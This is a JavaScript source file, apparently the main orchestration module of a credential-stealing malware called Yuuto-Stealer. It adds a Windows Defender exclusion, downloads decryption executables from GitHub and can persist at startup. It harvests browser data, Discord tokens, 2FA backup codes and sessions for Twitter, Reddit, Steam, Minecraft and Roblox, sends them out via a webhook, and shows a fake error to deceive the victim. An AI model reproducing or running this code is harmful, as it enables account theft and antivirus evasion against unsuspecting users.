const config = require('../config');
const { runningFromExecutable, sleep, runningFromStartup} = require('./general');
const { join, sep } = require('path');
const os = require('os');
const { execSync, spawnSync } = require('child_process');
const { copyFileSync, existsSync, mkdtempSync, createWriteStream } = require('fs');
const axios = require('axios');
const { twitter, reddit, steam, roblox, minecraft } = require('../functions/steal-sessions');

let tempFolder = '';

function createTempFolder() {
  tempFolder = mkdtempSync(join(os.tmpdir(), sep), 'utf8');
  !runningFromExecutable() && spawnSync('explorer', [tempFolder]);

  return tempFolder;
}

const getTempFolder = function() {
  return tempFolder;
};

module.exports = async () => {
  module.exports.getTempFolder = getTempFolder;
  const tempFolder = createTempFolder();

  if (runningFromExecutable()) await execSync(`powershell -Command Add-MpPreference -ExclusionPath "${tempFolder}"`);
  await download('https://github.com/JustYuuto/Yuuto-Stealer/raw/master/util/decrypt-token/decrypt_token.exe');
  await download('https://github.com/JustYuuto/Yuuto-Stealer/raw/master/util/decrypt-key/decrypt_key.exe');
  await sleep(500);

  if (config.addToStartup && runningFromExecutable()) require('../functions/startup');
  if (config.discord.killProcess) require('../functions/kill-discord');
  await require('../functions/grab-browsers-data');

  if (config.sessionStealing) {
    if (config.sessionStealing.discord) await require('../functions/grab-discord-token');
    if (config.sessionStealing.twitter) await twitter();
    if (config.sessionStealing.reddit) await reddit();
    if (config.sessionStealing.steam) await steam();
    if (config.sessionStealing.minecraft) await minecraft();
    if (config.sessionStealing.roblox) await roblox();
  }

  const mfaCodesPath = join(os.homedir(), 'Downloads', 'discord_backup_codes.txt');
  if (existsSync(mfaCodesPath)) {
    copyFileSync(mfaCodesPath, join(tempFolder, 'Discord 2FA Backup Codes.txt'));
  }
  await sleep(500);
  require('../functions/zip').then(await (require('../functions/webhook')));

  if (config.fakeError && !runningFromStartup()) require('../functions/fake-error');
};

async function download(url) {
  try {
    const { data } = await axios.get(url, {
      responseType: 'stream'
    });
    data.pipe(createWriteStream(join(getTempFolder(), url.split('/').pop())));
  } catch (e) {
    process.exit(0);
  }
}
